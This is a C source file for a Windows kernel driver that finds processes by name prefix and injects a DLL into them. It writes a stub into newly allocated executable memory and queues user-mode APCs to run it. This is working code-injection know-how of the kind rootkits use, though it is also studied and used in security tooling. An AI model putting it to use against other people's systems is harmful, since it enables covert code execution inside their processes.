#include <inc/keybrd.h>
#include <inc/klogger.h>
#include <inc/ecore.h>
#include <inc/ntapiex.h>
#include <injectstub/h/stub.h>

#define __SUBCOMPONENT__ "inject"
#define MODULE_TAG 'injc'

NTSTATUS
	InjectProcessAllocateCode(HANDLE ProcessHandle, PVOID *pBase, SIZE_T *pSize)
{
	NTSTATUS Status;
	PVOID BaseAddress = NULL;
	SIZE_T RegionSize = 16 * PAGE_SIZE;

	Status = ZwAllocateVirtualMemory(ProcessHandle, &BaseAddress, 0, &RegionSize, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (!NT_SUCCESS(Status)) {
		KLog(LError, "ZwAllocateVirtualMemory failed for procH=%p, error=%x\n", ProcessHandle, Status);
		return Status;
	}
	
	*pBase = BaseAddress;
	*pSize = RegionSize;

	return Status;
}

NTSTATUS
	InjectGetThreadByThreadInfo(IN PSYSTEM_THREAD_INFORMATION ThreadInfo, PETHREAD *pThread)
{
	PETHREAD Thread = NULL;
	NTSTATUS Status;

	Status = PsLookupThreadByThreadId(ThreadInfo->ClientId.UniqueThread, &Thread);
	if (!NT_SUCCESS(Status)) {
		KLog(LError, "cant lookup thread by id=%p", ThreadInfo->ClientId.UniqueThread);
		return Status;
	}

	*pThread = Thread;
	return STATUS_SUCCESS;
}

VOID
InjectApcKernelRoutine(
	IN PKAPC Apc,
	IN PKNORMAL_ROUTINE *NormalRoutine,
	IN PVOID *NormalContext,
	IN PVOID *SystemArgument1,
	IN PVOID *SystemArgument2
)
{
	UNREFERENCED_PARAMETER(NormalRoutine);
	UNREFERENCED_PARAMETER(NormalContext);
	UNREFERENCED_PARAMETER(SystemArgument1);
	UNREFERENCED_PARAMETER(SystemArgument2);

	KLog(LInfo, "InjectApcKernelRoutine");

	ExFreePool(Apc);
}

NTSTATUS
	InjectDllProcessThread(HANDLE ProcessHandle, PEPROCESS Process, PETHREAD Thread, PUNICODE_STRING DllPath, ULONG_PTR stubStart, SIZE_T stubSize)
{
	PKAPC Apc = NULL;
	ULONG Index = 0;
	LARGE_INTEGER Timeout;
	BOOLEAN ApcQueued = FALSE;

	Apc = ExAllocatePoolWithTag(NonPagedPool, sizeof(KAPC), MODULE_TAG);
	if (Apc == NULL) {
		KLog(LError, "No memory");
		return STATUS_NO_MEMORY;
	}

	KeInitializeApc(Apc,
		Thread,
		OriginalApcEnvironment,
		InjectApcKernelRoutine,
		NULL,
		(PVOID)(stubStart + sizeof(STUB_DATA)),
		UserMode,
		NULL);

	for (Index = 0; Index < 20; Index++) {
		if (KeInsertQueueApc(Apc,
			NULL,
			NULL,
			2)) {
			ApcQueued = TRUE;
			break;
		}

		KLog(LInfo, "KeInsertQueueApc failed index=%x", Index);
		Timeout.QuadPart = (LONGLONG)-100;
		KeDelayExecutionThread(KernelMode, FALSE, &Timeout);
	}

	return (ApcQueued) ? STATUS_SUCCESS : STATUS_UNSUCCESSFUL;
}

NTSTATUS
	InjectDllProcess(HANDLE ProcessHandle, PEPROCESS Process, PSYSTEM_PROCESS_INFORMATION ProcInfo, ULONG_PTR ProcInfoBarrier, PUNICODE_STRING DllPath)
{

	NTSTATUS Status;
	SIZE_T pStubSize = 0;
	KAPC_STATE ApcState;
	ULONG Index = 0;
	PETHREAD Thread = NULL;
	ULONG InjectedCount = 0;
	PSTUB_DATA pStubData = NULL;

	KLog(LInfo, "ProcH=%p, proc=%p, DllPath=%wZ", ProcessHandle, Process, DllPath);

	Status = InjectProcessAllocateCode(ProcessHandle, &pStubData, &pStubSize);
	if (!NT_SUCCESS(Status)) {
		return Status;
	}

	KLog(LInfo, "pStubCode=%p, pStubSize=%x", pStubData, pStubSize);

	KeStackAttachProcess(Process, &ApcState);
	RtlCopyMemory(pStubData, (PVOID)&stubStart, (ULONG)stubSize);
	KeUnstackDetachProcess(&ApcState);

	PSYSTEM_THREAD_INFORMATION ThreadInfo = (PSYSTEM_THREAD_INFORMATION)((ULONG_PTR)ProcInfo + sizeof(SYSTEM_PROCESS_INFORMATION));

	for (Index = 0; Index < ProcInfo->NumberOfThreads; Index++) {
		if ((ProcInfo->NextEntryOffset != 0) && ((ULONG_PTR)ThreadInfo + sizeof(SYSTEM_THREAD_INFORMATION)) > ((ULONG_PTR)ProcInfo + ProcInfo->NextEntryOffset))
			break;

		if (((ULONG_PTR)ThreadInfo + sizeof(SYSTEM_THREAD_INFORMATION)) > ProcInfoBarrier)
			break;

		Status = InjectGetThreadByThreadInfo(ThreadInfo, &Thread);
		if (!NT_SUCCESS(Status))
			continue;

		if (PsGetThreadProcessId(Thread) != PsGetProcessId(Process))
			goto _next_thread;

		KLog(LInfo, "found thread %p for injection", Thread);

		if (PsGetThreadWin32Thread(Thread) != NULL) {
			Status = InjectDllProcessThread(ProcessHandle, Process, Thread, DllPath, (ULONG_PTR)pStubData, stubSize);
			if (!NT_SUCCESS(Status))
				KLog(LError, "InjectDllProcessThread failed with err=%x", Status);
			else 
				InjectedCount++;
		}

_next_thread:		
		ObDereferenceObject(Thread);
		ThreadInfo = (PSYSTEM_THREAD_INFORMATION)((ULONG_PTR)ThreadInfo + sizeof(SYSTEM_THREAD_INFORMATION));
	}

	KLog(LInfo, "InjectedCount=%x", InjectedCount);
	if (InjectedCount > 0) {
		LARGE_INTEGER Timeout;

		Timeout.QuadPart = (LONGLONG)-5000;
		KeDelayExecutionThread(KernelMode, FALSE, &Timeout);

		KeStackAttachProcess(Process, &ApcState);
		Status = (pStubData->Inited) ? STATUS_SUCCESS : STATUS_UNSUCCESSFUL;
		KeUnstackDetachProcess(&ApcState);
		if (NT_SUCCESS(Status))
			KLog(LInfo, "Injection SUCCESS for proc=%p", Process);

		return Status;
	} else {
		pStubSize = 0;
		Status = ZwFreeVirtualMemory(ProcessHandle, &pStubData, &pStubSize, MEM_RELEASE);
		if (!NT_SUCCESS(Status)) {
			KLog(LError, "ZwFreeVirtualMemory for addr=%p failed with err=%x", pStubData, Status);
		}
	}

	return STATUS_UNSUCCESSFUL;
}

NTSTATUS
	CRtlUnicodeStringCopyToSZ(IN PUNICODE_STRING Src, OUT PUNICODE_STRING pDst) 
{
	UNICODE_STRING Dst = { 0, 0, NULL };

	Dst.Buffer = ExAllocatePoolWithTag(NonPagedPool, Src->MaximumLength + sizeof(WCHAR), MODULE_TAG);
	if (Dst.Buffer == NULL)
		return STATUS_NO_MEMORY;
	
	RtlCopyMemory(Dst.Buffer, Src->Buffer, Src->MaximumLength);
	
	Dst.Length = Src->Length;
	Dst.MaximumLength = Src->MaximumLength + sizeof(WCHAR);

	Dst.Buffer[Src->MaximumLength / sizeof(WCHAR)] = L'\0';
	*pDst = Dst;

	return STATUS_SUCCESS;
}

VOID
	CRtlUnicodeStringFreeAndZero(IN PUNICODE_STRING Src)
{
	if (Src->Buffer != NULL)
		ExFreePool(Src->Buffer);

	RtlZeroMemory(Src, sizeof(UNICODE_STRING));
}



NTSTATUS
	InjectQueryAllProcessInfo(
		OUT PSYSTEM_PROCESS_INFORMATION *pInfo,
		OUT ULONG *pInfoSize
		)
{
	NTSTATUS Status = STATUS_UNSUCCESSFUL;
	PSYSTEM_PROCESS_INFORMATION Info = NULL;
	ULONG InfoLength = 100 * sizeof(SYSTEM_PROCESS_INFORMATION);
	ULONG ReqLength = 0;

	Info = ExAllocatePoolWithTag(NonPagedPool, InfoLength, MODULE_TAG);
	if (Info == NULL) {
		KLog(LError, "No memory InfoLength=%x", InfoLength);
		return STATUS_NO_MEMORY; 
	}

	while (TRUE) {
		Status = ZwQuerySystemInformation(SystemProcessInformation, Info, InfoLength, &ReqLength);
		KLog(LInfo, "ZwQuerySystemInformation status=%x, infolen=%x, reqLen=%x", Status, InfoLength, ReqLength);
		if ((Status == STATUS_BUFFER_TOO_SMALL) || (Status == STATUS_INFO_LENGTH_MISMATCH)) {
			ExFreePool(Info);
			InfoLength = ReqLength + 100 * sizeof(SYSTEM_PROCESS_INFORMATION);
			Info = ExAllocatePoolWithTag(NonPagedPool, InfoLength, MODULE_TAG);
			if (Info == NULL) {
				KLog(LError, "No memory InfoLength=%x", InfoLength);
				return STATUS_NO_MEMORY;
			}
			continue;
		} else {
			break;
		}
	}
	
	if (!NT_SUCCESS(Status)) {
		KLog(LError, "ZwQuerySystemInformation status=%x", Status);
		if (Info != NULL)
			ExFreePool(Info);
		*pInfo = NULL;
		*pInfoSize = 0;
	} else {
		*pInfo = Info;
		*pInfoSize = ReqLength;
	}

	return Status;
}

NTSTATUS
InjectCheckProcessAndInjectDll(PEPROCESS Process, PSYSTEM_PROCESS_INFORMATION ProcInfo, ULONG_PTR ProcInfoBarrier, PUNICODE_STRING ProcessPrefix, PUNICODE_STRING DllPath)
{
	NTSTATUS Status;
	PUNICODE_STRING pImageFileName = NULL;
	UNICODE_STRING ImageFileNameSz = { 0, 0, NULL };
	UNICODE_STRING ProcessPrefixSz = { 0, 0, NULL };
	HANDLE ProcessHandle = NULL;
	BOOLEAN bProcAcqured = FALSE;

	Status = SeLocateProcessImageName(Process, &pImageFileName);
	if (!NT_SUCCESS(Status)) {
		KLog(LError, "SeLocateProcessImageName proc=%p error=%x", Process, Status);
		return Status;
	}

	KLog(LInfo, "Proc=%p name is %wZ", Process, pImageFileName);
	if (pImageFileName->Buffer == NULL || pImageFileName->Length == 0) {
		KLog(LError, "Empty process name for proc=%p", Process);
		goto cleanup;
	}

	Status = CRtlUnicodeStringCopyToSZ(pImageFileName, &ImageFileNameSz);
	if (!NT_SUCCESS(Status)) {
		KLog(LError, "CRtlCopyUnicodeStringSZ error=%x", Status);
		goto cleanup;
	}

	Status = CRtlUnicodeStringCopyToSZ(ProcessPrefix, &ProcessPrefixSz);
	if (!NT_SUCCESS(Status)) {
		KLog(LError, "CRtlCopyUnicodeStringSZ error=%x", Status);
		goto cleanup;
	}

	if (ProcessPrefixSz.Length > ImageFileNameSz.Length)
		goto cleanup;

	if (wcsstr(ImageFileNameSz.Buffer, ProcessPrefixSz.Buffer) == NULL)
		goto cleanup;

	KLog(LInfo, "Found match process name=%wZ, prefix=%wZ", &ImageFileNameSz, &ProcessPrefixSz);
	Status = PsAcquireProcessExitSynchronization(Process);
	if (!NT_SUCCESS(Status)) {
		KLog(LError, "Cant acquire process=%p, name=%wZ, error=%x", Process, &ImageFileNameSz, Status);
		goto cleanup;
	}
	bProcAcqured = TRUE;

	Status = ObOpenObjectByPointer(Process, OBJ_KERNEL_HANDLE, NULL, 0, *PsProcessType, KernelMode, &ProcessHandle);
	if (!NT_SUCCESS(Status)) {
		KLog(LError, "Cant open handle for process=%p, name=%wZ, error=%x", Process, &ImageFileNameSz, Status);
		goto cleanup;
	}

	Status = InjectDllProcess(ProcessHandle, Process, ProcInfo, ProcInfoBarrier, DllPath);
	if (!NT_SUCCESS(Status)) {
		KLog(LError, "Can't inject dll for process=%p, name=%wZ, error=%x", Process, &ImageFileNameSz, Status);
	}

cleanup:
	if (ProcessHandle != NULL)
		ZwClose(ProcessHandle);

	if (bProcAcqured)
		PsReleaseProcessExitSynchronization(Process);

	if (pImageFileName != NULL)
		ExFreePool(pImageFileName);

	CRtlUnicodeStringFreeAndZero(&ImageFileNameSz);
	CRtlUnicodeStringFreeAndZero(&ProcessPrefixSz);
	
	return Status;
}

NTSTATUS
	InjectFindAllProcessesAndInjectDll(PUNICODE_STRING ProcessPrefix, PUNICODE_STRING DllPath)
{
	PEPROCESS Process = NULL;
	NTSTATUS Status;
	PSYSTEM_PROCESS_INFORMATION ProcInfo = NULL;
	ULONG ProcInfoSize = 0;
	PSYSTEM_PROCESS_INFORMATION CurrProcInfo = NULL;
	ULONG_PTR NextEntryAddr = 0;
	ULONG_PTR ProcInfoBarrier = 0;

	Status = InjectQueryAllProcessInfo(&ProcInfo, &ProcInfoSize);
	if (!NT_SUCCESS(Status)) {
		return Status;
	}

	CurrProcInfo = ProcInfo;
	ProcInfoBarrier = (ULONG_PTR)ProcInfo + ProcInfoSize;

	do {
		Status = PsLookupProcessByProcessId(CurrProcInfo->UniqueProcessId, &Process);
		if (!NT_SUCCESS(Status)) {
			KLog(LError, "lookup for pid=%p failed error=%x", CurrProcInfo->UniqueProcessId, Status);
			goto _next_process;
		}
		KLog(LInfo, "found proc %p by pid=%p", Process, CurrProcInfo->UniqueProcessId);

		Status = InjectCheckProcessAndInjectDll(Process, CurrProcInfo, ProcInfoBarrier, ProcessPrefix, DllPath);
		if (!NT_SUCCESS(Status)) {
			goto _deref_next_process;
		}

_deref_next_process:
		ObfDereferenceObject(Process);
_next_process:

		NextEntryAddr = ((ULONG_PTR)CurrProcInfo + CurrProcInfo->NextEntryOffset);
		if (NextEntryAddr < ((ULONG_PTR)CurrProcInfo + sizeof(SYSTEM_PROCESS_INFORMATION)))
			break;

		if ((NextEntryAddr + sizeof(SYSTEM_PROCESS_INFORMATION)) > ProcInfoBarrier)
			break;

		CurrProcInfo = (PSYSTEM_PROCESS_INFORMATION)NextEntryAddr;

	} while (TRUE);

	if (ProcInfo != NULL)
		ExFreePool(ProcInfo);

	return STATUS_SUCCESS;
}
